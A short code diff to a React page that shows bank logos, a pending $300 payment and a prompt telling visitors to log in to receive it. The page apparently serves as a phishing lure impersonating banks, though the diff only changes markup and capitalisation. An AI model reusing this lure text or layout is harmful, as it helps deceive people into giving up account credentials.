@@ -218,7 +218,7 @@ export default function MegaPage() {
               src="/boa.png"
               alt="avatar"
             />
-            <img
+            {/* <img
               className="p_avatar"
               src="/citi.jpg"
               alt="avatar"
@@ -227,7 +227,7 @@ export default function MegaPage() {
               className="p_avatar"
               src="/wf.png"
               alt="avatar"
-            />
+            /> */}
 
             <div className="p_user_info">
               {/* <div className="p_user_id">779 478 933 (Binance ID)</div> */}
@@ -271,7 +271,7 @@ export default function MegaPage() {
               onSubmit={handleSubmit(handleAddBooking)}
               className="login-body"
             >
-                <small className="p_pp">payment pending $300</small>
+                <small className="p_pp">Payment Pending $300</small>
                 <p className="p_ppp">
                   For receiving your payment, please log in to your account.
                 </p>
